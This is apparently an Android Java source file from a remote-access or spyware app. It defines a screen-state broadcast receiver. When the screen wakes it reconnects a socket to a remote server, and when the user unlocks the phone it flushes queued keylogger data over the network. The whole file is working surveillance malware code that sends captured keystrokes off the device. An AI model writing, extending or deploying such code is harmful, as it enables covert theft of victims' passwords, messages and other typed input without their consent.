package com.fason.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.fason.app.core.network.SocketClient;
import com.fason.app.features.keylogger.KeyloggerDataManager;

/**
 * Monitors screen state changes and triggers useful actions:
 * - Screen ON: Verify socket connection and reconnect if needed
 * - User present (unlocked): Flush pending keylogger data
 */
public class ScreenStateReceiver extends BroadcastReceiver {
    private static final String TAG = "ScreenState";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        switch (intent.getAction()) {
            case Intent.ACTION_SCREEN_ON:
                Log.d(TAG, "Screen ON — checking socket connection");
                // Device woke up — verify socket is connected
                try {
                    SocketClient client = SocketClient.getInstance();
                    io.socket.client.Socket s = client.getSocket();
                    if (s != null && !s.connected()) {
                        Log.d(TAG, "Socket disconnected, triggering reconnect");
                        s.connect();
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Socket reconnect on screen ON failed: " + e.getMessage());
                }
                break;

            case Intent.ACTION_SCREEN_OFF:
                Log.d(TAG, "Screen OFF");
                break;

            case Intent.ACTION_USER_PRESENT:
                Log.d(TAG, "User unlocked device — flushing pending data");
                // User unlocked — good time to flush pending keylogger data
                try {
                    KeyloggerDataManager dm = KeyloggerDataManager.getInstance();
                    if (dm.getQueuedCount() > 0) {
                        dm.flushToNetwork();
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Flush on unlock failed: " + e.getMessage());
                }
                break;
        }
    }
}
